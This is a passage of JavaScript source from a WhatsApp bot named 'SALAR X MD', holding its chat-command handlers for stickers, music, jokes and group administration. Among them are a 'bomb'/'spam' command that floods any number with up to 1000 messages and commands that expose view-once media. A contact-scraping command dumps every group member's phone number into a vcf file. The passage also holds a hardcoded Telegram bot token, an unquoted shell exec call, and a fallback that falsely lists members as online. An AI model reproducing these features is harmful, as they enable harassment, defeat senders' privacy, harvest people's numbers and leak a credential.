                    return reply(`👥 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Online*\n\nThis command only works in groups.`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🟢', key: m.key } });

                    // Get group metadata first
                    const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                    const totalMembers = groupMetadata?.participants?.length || 0;

                    let online = [];
                    let botJid = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';

                    // Method 1: Check presences store
                    if (store && store.presences && store.presences[m.chat]) {
                        const presences = store.presences[m.chat];

                        for (let [jid, presence] of Object.entries(presences)) {
                            // Check if user is online/available
                            if (presence.lastKnownPresence === 'available' ||
                                presence.lastPresence === 'online' ||
                                presence.presences?.lastPresence === 'online') {
                                if (!online.includes(jid)) {
                                    online.push(jid);
                                }
                            }
                        }
                    }

                    // Method 2: Get from group metadata (as fallback)
                    if (online.length === 0) {
                        // Show first 10 as "recently active" since we can't really know
                        online = groupMetadata?.participants?.slice(0, 10).map(p => p.id);
                    }

                    // Add bot to list if not already there
                    if (!online.includes(botJid)) {
                        online.unshift(botJid); // Add bot at top
                    }

                    // Remove duplicates
                    online = [...new Set(online)];

                    if (online.length === 0) {
                        return reply(`👤 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Online*\n\nNo members currently online in ${groupMetadata?.subject}.`);
                    }

                    // Format message with group info
                    let text = `🟢 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Online*\n\n`;
                    text += `Group: ${groupMetadata?.subject}\n`;
                    text += `Total: ${totalMembers} members\n`;
                    text += `Online: ${online.length} currently\n\n`;

                    online.forEach((user, index) => {
                        let emoji = user === botJid ? '🤖' : '👤';
                        text += `${emoji} ${index + 1}. @${user.split('@')[0]}\n`;
                    });

                    text += `\n_Updated: ${new Date().toLocaleTimeString()}_`;

                    await devtrust.sendMessage(m.chat, {
                        text: text,
                        mentions: online
                    }, { quoted: m });

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Listonline error:', error);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Online*\n\nOnline checker is taking a nap. Try again later.`);
                }
            }
                break;

            case 'gpt3':
            case 'open-%+%ai':
            case 'vxnxji': {
                if (!text) return reply(`🤖 *Example:* ${command} how are you?`);

                async function openai(text) {
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        model: { id: "gpt-3", name: "GPT-3" },
                        messages: [{ content: text, role: "user" }],
                        temperature: 0.5
                    });
                    return response.data;
                }

                try {
                    let pei = await openai(text);
                    reply(`🤖 *GPT-3*\n\n${pei}`);
                } catch (e) {
                    reply("❌ *GPT-3 error* • Try later");
                }
            }
                break;

            case 'quote': {
                try {
                    const res = await fetch('https://zenquotes.io/api/random');
                    const json = await res.json();
                    const quote = json[0].q;
                    const author = json[0].a;

                    const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: quoteImg },
                            caption: `_"${quote}"_\n— *${author}*`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Quote failed*');
                }
            }
                break;

            case 'joke': {
                try {
                    let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single');
                    let data = await res.json();

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: 'https://i.ibb.co/rGr4bWW8/image1.jpg' },
                            caption: `😂 *Joke*\n\n${data.joke}`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Joke failed*');
                }
            }
                break;

            case 'truth': {
                try {
                    let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
                    let data = await res.json();

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: 'https://i.ibb.co/rGr4bWW8/image1.jpg' },
                            caption: `😳 *Truth*\n\n❖ ${data.question}`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Truth failed*');
                }
            }
                break;

            case 'dare': {
                try {
                    let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
                    let data = await res.json();

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: 'https://i.ibb.co/rGr4bWW8/image1.jpg' },
                            caption: `😈 *Dare*\n\n❖ ${data.question}`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Dare failed*');
                }
            }
                break;

            case 'jid': {
                reply(from);
            }
                break;

            case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast':
            case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow':
            case 'smooth': case 'squirrel': {
                try {
                    let set;
                    if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
                    else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
                    else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
                    else if (/earrape/.test(command)) set = '-af volume=12';
                    else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
                    else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
                    else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
                    else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
                    else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
                    else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
                    else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
                    else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';

                    if (set) {
                        if (/audio/.test(mime)) {
                            // Processing message (simple like your style)
                            reply(`⚡ *ᴘʀᴏᴄᴇssɪɴɢ ${command.toUpperCase()} ᴇғғᴇᴄᴛ...*`);

                            // FIXED: changed 'bad' to 'devtrust'
                            let media = await devtrust.downloadAndSaveMediaMessage(quoted);
                            let ran = getRandom('.mp3');

                            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                                fs.unlinkSync(media);
                                if (err) {
                                    console.error(`ғғᴍᴘᴇɢ ᴇʀʀᴏʀ: ${err}`);
                                    return reply(`❌ *ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴘᴘʟʏ ${command.toUpperCase()} ᴇғғᴇᴄᴛ*`);
                                }

                                let buff = fs.readFileSync(ran);
                                // FIXED: changed 'bad' to 'devtrust'
                                devtrust.sendMessage(m.chat,
                                    addNewsletterContext({
                                        audio: buff,
                                        mimetype: 'audio/mpeg'
                                    }),
                                    { quoted: m }
                                );
                                fs.unlinkSync(ran);
                            });
                        } else {
                            reply(`🎵 *Reply to audio with ${prefix + command}*`);
                        }
                    } else {
                        reply(`❌ *Invalid effect*\nᴜsᴇ: .bass, .blown, .deep, .earrape, .fast, .fat, .nightcore, .reverse, .robot, .slow, .smooth, .squirrel`);
                    }
                } catch (e) {
                    reply(`❌ *Error:* ${e.message}`);
                }
                break;
            }

            case 'say':
            case 'tts':
            case 'gtts': {
                if (!text) return reply("🗣️ *What should I say?*");

                const ttsUrl = googleTTS.getAudioUrl(text, {
                    lang: "en",
                    slow: false,
                    host: "https://translate.google.com",
                });

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        audio: { url: ttsUrl },
                        mimetype: "audio/mp4",
                        ptt: true,
                        fileName: `${text}.mp3`,
                        caption: `🔊 *Saying:* ${text}`
                    }),
                    { quoted: m }
                );
            }
                break;

            case "rwaifu": {
                const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: imageUrl },
                        caption: "✨ *Random Waifu*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'waifu': {
                try {
                    const waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: waifudd.data.url },
                            caption: "✨ *Waifu*"
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Error*');
                }
            }
                break;

            case 'vv':
            case 'vvgh': {
                if (!isCreator) return reply("🔒 *Owner only*");
if (!m.quoted) return await devtrust.sendMessage(m.chat,
    addNewsletterContext({
        text: '📸 *Reply to a view-once media*'
    }),
    { quoted: m }
);

                try {
                    const mediaBuffer = await devtrust.downloadMediaMessage(m.quoted);
                    if (!mediaBuffer) return reply('❌ *Download failed*');

                    const mediaType = m.quoted.mtype;

                    if (mediaType === 'imageMessage') {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: mediaBuffer,
                                caption: "🖼️ *View-Once Image*"
                            }),
                            { quoted: m }
                        );
                    } else if (mediaType === 'videoMessage') {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                video: mediaBuffer,
                                caption: "🎥 *View-Once Video*"
                            }),
                            { quoted: m }
                        );
                    } else if (mediaType === 'audioMessage') {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                audio: mediaBuffer,
                                mimetype: 'audio/ogg',
                                ptt: true,
                                caption: "🔊 *View-Once Voice*"
                            }),
                            { quoted: m }
                        );
                    }
                } catch (error) {
                    console.error('Error:', error);
                    reply('❌ *Something went wrong*');
                }
            }
                break;

            case 'vv2':
            case 'readviewonce2': {
                if (!m.quoted) {
                    return reply(`👁️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nReply to a view-once media with ${prefix}${command}`);
                }

                let mime = (m.quoted.msg || m.quoted).mimetype || '';

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '👁️', key: m.key } });

                    let media = await m.quoted.download();

                    if (/image/.test(mime)) {
                        await devtrust.sendMessage(m.chat, {
                            image: media,
                            caption: `🔓 *View-Once Image*\nRevealed by: ${m?.sender?.split('@')?.[0] || 'User'}`
                        }, { quoted: m });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nImage revealed above.`);

                    } else if (/video/.test(mime)) {
                        await devtrust.sendMessage(m.chat, {
                            video: media,
                            caption: `🔓 *View-Once Video*\nRevealed by: ${m?.sender?.split('@')?.[0] || 'User'}`
                        }, { quoted: m });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nVideo revealed above.`);

                    } else if (/audio/.test(mime)) {
                        await devtrust.sendMessage(m.chat, {
                            audio: media,
                            mimetype: 'audio/mpeg',
                            ptt: true
                        }, { quoted: m });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nAudio revealed above.`);

                    } else {
                        reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nUnsupported media type.`);
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (err) {
                    console.error('View once error:', err);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 View Once*\n\nFailed to process media.`);
                }
            }
                break;

            case '😭': {
                if (!m.quoted) return reply('😐');

                let mime = (m.quoted.msg || m.quoted).mimetype || '';

                try {
                    let media = await m.quoted.download();
                    let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';

                    if (/image/.test(mime)) {
                        await devtrust.sendMessage(botNumber, { image: media });
                        reply('🥲');
                    } else if (/video/.test(mime)) {
                        await devtrust.sendMessage(botNumber, { video: media });
                        reply('🥲');
                    } else if (/audio/.test(mime)) {
                        await devtrust.sendMessage(botNumber, {
                            audio: media,
                            mimetype: 'audio/mpeg',
                            ptt: true
                        });
                        reply('🥲');
                    } else {
                        reply('😶');
                    }
                } catch (err) {
                    console.error('Ghost error:', err);
                    reply('🫠');
                }
            }
                break;

            case 'save':
            case 'download':
            case 'svt': {
                if (!isCreator) {
                    return reply(`🔒 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nOwner only command.`);
                }

                if (!m.quoted) {
                    return reply(`💾 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nReply to any media to save it.`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '💾', key: m.key } });

                    let media = await m.quoted.download();
                    let mime = (m.quoted.msg || m.quoted).mimetype || '';
                    let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';

                    if (/image/.test(mime)) {
                        await devtrust.sendMessage(botNumber, {
                            image: media,
                            caption: `📸 From: ${m?.sender?.split('@')?.[0] || 'User'}`
                        });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nImage saved to bot's DM.`);

                    } else if (/video/.test(mime)) {
                        await devtrust.sendMessage(botNumber, {
                            video: media,
                            caption: `🎥 From: ${m?.sender?.split('@')?.[0] || 'User'}`
                        });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nVideo saved to bot's DM.`);

                    } else if (/audio/.test(mime)) {
                        await devtrust.sendMessage(botNumber, {
                            audio: media,
                            mimetype: 'audio/mpeg'
                        });
                        reply(`✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nAudio saved to bot's DM.`);

                    } else {
                        reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nUnsupported media type.`);
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (err) {
                    console.error('Save error:', err);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Save*\n\nFailed to save media.`);
                }
            }
                break;

            case 'qc': {
                if (!text) return reply('💬 *Example:* qc Your quote here');

                const name = m.pushName || 'User';
                const quote = text.trim();

                let profilePic;
                try {
                    profilePic = await devtrust.profilePictureUrl(m.sender, 'image');
                } catch {
                    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg';
                }

                const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

                try {
                    await devtrust.sendImageAsSticker(m.chat, url, m, {
                        packname: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                        author: "Quote"
                    });
                } catch (err) {
                    reply('❌ *Quote sticker failed*');
                }
            }
                break;

            case 'shorturl': {
                if (!text) return reply('🔗 *Provide a URL*');

                try {
                    let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
                    if (!shortUrl1) return reply(`❌ *Failed to shorten URL*`);

                    reply(`🔗 *Shortened*\n${shortUrl1}`);
                } catch (e) {
                    reply('❌ *Error*');
                }
            }
                break;

            case 'unblock': {
                if (!isCreator) return reply("🔒 *Owner only*");

                let users = m.mentionedJid[0] ? m.mentionedJid[0] :
                    m.quoted ? m.quoted.sender :
                        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                await devtrust.updateBlockStatus(users, 'unblock');
                reply(`✅ *User unblocked*`);
            }
                break;

            case 'block': {
                if (!isCreator) return reply("🔒 *Owner only*");

                let users = m.mentionedJid[0] ? m.mentionedJid[0] :
                    m.quoted ? m.quoted.sender :
                        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                await devtrust.updateBlockStatus(users, 'block');
                reply(`🚫 *User blocked*`);
            }
                break;

            case 'creategc':
            case 'creategroup': {
                if (!isCreator) return reply("🔒 *Owner only*");

                const groupName = args.join(" ");
                if (!groupName) return reply(`📝 *Usage:* ${prefix + command} Group Name`);

                try {
                    const cret = await devtrust.groupCreate(groupName, []);
                    const code = await devtrust.groupInviteCode(cret.id);
                    const link = `https://chat.whatsapp.com/${code}`;

                    const teks = `✅ *Group Created*\n\n` +
                        `💳 Name: ${cret.subject}\n` +
                        `👤 Owner: @${cret.owner.split("@")[0]}\n` +
                        `🔗 ${link}`;

                    devtrust.sendMessage(m.chat, addNewsletterContext({
                        text: teks,
                        mentions: [cret.owner]
                    }), { quoted: m });

                } catch (e) {
                    reply("❌ *Failed to create group*");
                }
            }
                break;

            case 'tgstickers': {
                if (!text) return reply(`❌ *Example:* tgstickers https://t.me/addstickers/AnimePack`);

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

                    let packUrl = text.trim();
                    if (!packUrl.includes("t.me/addstickers/"))
                        return reply("❌ *Invalid Telegram sticker link*");

                    let packName = packUrl.split("/addstickers/")[1];
                    let api = `https://api.telegram.org/bot8041800861:AAEpSfx3seoEgnjA66jYPTuqZ9sB0eBPnbQ/getStickerSet?name=${packName}`;
                    let { data } = await axios.get(api);

                    if (!data.ok) return reply("❌ *Failed to fetch sticker pack*");

                    let stickers = data.result.stickers;
                    reply(`✅ Found ${stickers.length} stickers. Sending...`);

                    for (let i = 0; i < stickers.length; i++) {
                        try {
                            let filePathRes = await axios.get(
                                `https://api.telegram.org/bot8041800861:AAEpSfx3seoEgnjA66jYPTuqZ9sB0eBPnbQ/getFile?file_id=${stickers[i].file_id}`
                            );
                            let fileUrl = `https://api.telegram.org/file/bot8041800861:AAEpSfx3seoEgnjA66jYPTuqZ9sB0eBPnbQ/${filePathRes.data.result.file_path}`;

                            let buffer = await getBuffer(fileUrl);
                            await devtrust.sendImageAsSticker(m.chat, buffer, m, {
                                packname: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                                author: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 TG ➝ WA"
                            });

                            await sleep(1500);
                        } catch (err) {
                            console.log("Sticker error:", err.message);
                        }
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (e) {
                    console.error(e);
                    reply("❌ *Error fetching stickers*");
                }
            }
                break;

            case "savecontact":
            case "vcf":
            case "scontact":
            case "savecontacts": {
                if (!m.isGroup) {
                    return reply("👥 *Groups only*");
                }

                try {
                    let metadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                    let participants = metadata?.participants || [];
                    let vcard = "";
                    let noPort = 1;

                    for (let a of participants) {
                        let num = a.id.split("@")[0];
                        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${num}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
                    }

                    let filePath = "./contacts.vcf";
                    fs.writeFileSync(filePath, vcard.trim());

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            document: fs.readFileSync(filePath),
                            mimetype: "text/vcard",
                            fileName: `${metadata?.subject}.vcf`,
                            caption: `📇 *${participants.length} contacts saved*`
                        }),
                        { quoted: m }
                    );

                    fs.unlinkSync(filePath);
                } catch (err) {
                    reply("⚠️ Error: " + err.toString());
                }
            }
                break;

            case 'toimg': {
                const quoted = m.quoted ? m.quoted : null;
                const mime = (quoted?.msg || quoted)?.mimetype || '';

                if (!quoted) return reply('🖼️ *Reply to a sticker*');
                if (!/webp/.test(mime)) return reply(`❌ *Reply to a sticker with ${prefix}toimg*`);

                if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

                const media = await devtrust.downloadMediaMessage(quoted);
                const filePath = `./tmp/${Date.now()}.jpg`;

                fs.writeFileSync(filePath, media);

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: fs.readFileSync(filePath)
                    }),
                    { quoted: m }
                );

                fs.unlinkSync(filePath);
            }
                break;

            case 'tosticker':
            case 'sticker':
            case 's': {
                if (!m.quoted) {
                    return reply(`🎨 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Maker*\n\nReply to an image or video with:\n${prefix}${command}\n\nVideo limit: Max 10 seconds`);
                }

                const mime = (m.quoted.msg || m.quoted).mimetype || '';
                const mediaType = (m.quoted.msg || m.quoted).seconds || 0;

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

                    // Image to sticker
                    if (/image/.test(mime)) {
                        let media = await m.quoted.download();
                        await devtrust.sendImageAsSticker(m.chat, media, m, {
                            packname: global.packname || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                            author: global.author || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗"
                        });
                    }

                    // Video to sticker
                    else if (/video/.test(mime)) {
                        // Check video duration
                        if (mediaType > 10) {
                            return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Maker*\n\nVideo too long: ${mediaType}s\nMax duration: 10 seconds`);
                        }

                        let media = await m.quoted.download();
                        await devtrust.sendVideoAsSticker(m.chat, media, m, {
                            packname: global.packname || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                            author: global.author || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗"
                        });
                    }

                    else {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Maker*\n\nInvalid media. Reply to an image or video.\n\nSupported:\n• Images (jpg, png, webp)\n• Videos (mp4, webm, gif) max 10s`);
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Sticker error:', error);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Maker*\n\nSticker machine is jammed. Try again later.`);
                }
            }
                break;

            case 'play':
            case 'ytmp3': {
                if (!text) {
                    return reply(`🎵 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play*\n\nUsage: ${prefix}play [song name]\nExample: ${prefix}play faded`);
                }

                try {
                    // Use the correct socket variable (devtrust instead of bad)
                    await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });

                    reply(`⏳ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play*\n\nSearching: ${text}\nGive me a moment...`);

                    const response = await axios.get(`https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(text)}&apikey=`, {
                        timeout: 60000
                    });

                    console.log('David Cyril API Response:', JSON.stringify(response.data, null, 2));

                    const data = response.data;

                    if (data.status && data.result?.download_url) {
                        reply(`🎵 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play*\n\nTitle: ${data.result.title || 'N/A'}\nDuration: ${data.result.duration || 'N/A'}\nViews: ${data.result.views?.toLocaleString() || 'N/A'}\n\nDownloading audio...`);

                        const audioResponse = await axios.get(data.result.download_url, {
                            responseType: 'arraybuffer',
                            timeout: 120000
                        });

                        const audioBuffer = Buffer.from(audioResponse.data);

                        // Use devtrust here too
                        await devtrust.sendMessage(m.chat, addNewsletterContext({
                            audio: audioBuffer,
                            mimetype: "audio/mpeg",
                            fileName: `${data.result.title}.mp3`,
                            contextInfo: {
                                externalAdReply: {
                                    thumbnailUrl: data.result.thumbnail,
                                    title: data.result.title,
                                    body: `👁️ ${data.result.views.toLocaleString()} views • ⏱️ ${data.result.duration}`,
                                    sourceUrl: data.result.video_url,
                                    renderLargerThumbnail: true,
                                    mediaType: 1
                                }
                            }
                        }), { quoted: m });

                        // Use devtrust here too
                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    } else {
                        throw new Error('No audio download link received from API');
                    }

                } catch (error) {
                    console.error('Play Error:', error.response?.data || error.message);

                    // Use devtrust here too
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });

                    if (error.response?.status === 404) {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play*\n\nTrack "${text}" not found. Try a different song or check spelling.`);
                    }

                    return reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play*\n\nMusic service is napping. Try again in a moment.`);
                }
            }
                break;

            case 'bomb':
            case 'spam': {
                const q = m.message?.conversation ||
                    m.message?.extendedTextMessage?.text || '';
                const [target, text, countRaw] = q.split(',').map(x => x?.trim());

                const count = parseInt(countRaw) || 5;

                if (!isOwner || !target || !text || !count) {
                    return reply('📌 *Usage:* spam number,message,count');
                }

                const jid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

                if (count > 1000) {
                    return reply('❌ *Max 1000 messages*');
                }

                reply(`💣 *Spamming ${target} with ${count} messages*`);

                for (let i = 0; i < count; i++) {
                    await devtrust.sendMessage(jid, addNewsletterContext({ text }));
                    await delay(700);
                }

                reply(`✅ *Spam complete*`);
                break;
            }

            case 'ytmp3': {
                if (!text) {
                    return reply(`🎵 *Example:* ${prefix + command} YouTube URL`);
                }

                try {
                    reply('⏳ *Fetching audio...*');

                    const apiUrl = `https://apis.prexzyvilla.site/download/ytmp3?url=${encodeURIComponent(text)}`;
                    const { data } = await axios.get(apiUrl, { timeout: 15000 });

                    if (data && data.success) {
                        const { title, thumbnail, download_url } = data.result;
                        const audioBuffer = (await axios.get(download_url, { responseType: 'arraybuffer' })).data;

                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: thumbnail },
                                caption: `🎵 *${title}*`
                            }),
                            { quoted: m }
                        );

                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                audio: audioBuffer,
                                mimetype: 'audio/mpeg'
                            }),
                            { quoted: m }
                        );
                    } else {
                        reply("❌ *Couldn't fetch audio*");
                    }
                } catch (error) {
                    reply("❌ *Error processing request*");
                }
            }
                break;

            case 'play2': {
                if (!text) {
                    return reply(`🎵 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play2*\n\nUsage: ${prefix}play2 [song name]\nExample: ${prefix}play2 faded`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

                    reply(`🔍 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗Play2*\n\nSearching: ${text}`);

                    const response = await axios.get(`https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(text)}&apikey=`, {
                        timeout: 30000
                    });

                    const data = response.data;

                    if (data.status && data.result?.download_url) {
                        // Send thumbnail first
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: data.result.thumbnail },
                                caption: `🎵 *${data.result.title}*\n⏱️ ${data.result.duration} • 👁️ ${data.result.views?.toLocaleString() || 'N/A'}`
                            }),
                            { quoted: m }
                        );

                        // Download and send audio
                        const audioResponse = await axios.get(data.result.download_url, {
                            responseType: 'arraybuffer',
                            timeout: 120000
                        });

                        const audioBuffer = Buffer.from(audioResponse.data);

                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                audio: audioBuffer,
                                mimetype: 'audio/mpeg',
                                fileName: `${data.result.title}.mp3`
                            }),
                            { quoted: m }
                        );

                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    } else {
                        throw new Error('No download link received');
                    }

                } catch (error) {
                    console.error('Play2 Error:', error.message);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });

                    if (error.response?.status === 404) {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play2*\n\nTrack "${text}" not found. Try a different song.`);
                    }

                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Play2*\n\nMusic service is busy. Try again in a moment.`);
                }
            }
                break;

            case 'ibsbmg': {
                if (!q) return reply(`🎨 *Use:* img prompt,ratio\nExample: img robin,3:4`);

                let parts = q.split(',');
                let prompt = parts[0]?.trim();
                let ratio = parts[1]?.trim() || "1:1";

                try {
                    let apiUrl = `https://apis.prexzyvilla.site/ai/imagen?prompt=${encodeURIComponent(prompt)}&ratio=${encodeURIComponent(ratio)}`;
                    let res = await fetch(apiUrl);
                    let data = await res.json();

                    if (data.status && data.result) {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: data.result },
                                caption: `🎨 *${prompt}* (${ratio})`
                            }),
                            { quoted: m }
                        );
                    } else {
                        reply("❌ *Failed to generate image*");
                    }
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error fetching from API*");
                }
            }
                break;

            case 'kick': {
                if (!isCreator) return reply("🔒 *Owner only*");
                if (!m.quoted) return reply("👤 *Tag or quote user to kick*");
                if (!m.isGroup) return reply("👥 *Groups only*");

                let users = m.mentionedJid[0] || m.quoted?.sender ||
                    text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                await devtrust.groupParticipantsUpdate(m.chat, [users], 'remove');
                reply("✅ *User kicked*");
            }
                break;

            case 'listadmin':
            case 'tagadmin':
            case 'admin': {
                if (!isCreator) return reply("🔒 *Owner only*");
                if (!m.isGroup) return reply("👥 *Groups only*");

                const groupAdmins = participants.filter(p => p.admin);
                const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
                const owner = groupMetadata?.owner ||
                    groupAdmins.find(p => p.admin === 'superadmin')?.id ||
                    m.chat.split`-`[0] + '@s.whatsapp.net';

                let text = `👑 *Admins*\n\n${listAdmin}`;

                devtrust.sendMessage(m.chat, addNewsletterContext({
                    text,
                    mentions: [...groupAdmins.map(v => v.id), owner]
                }), { quoted: m });
            }
                break;

            case 'delete':
            case 'del': {
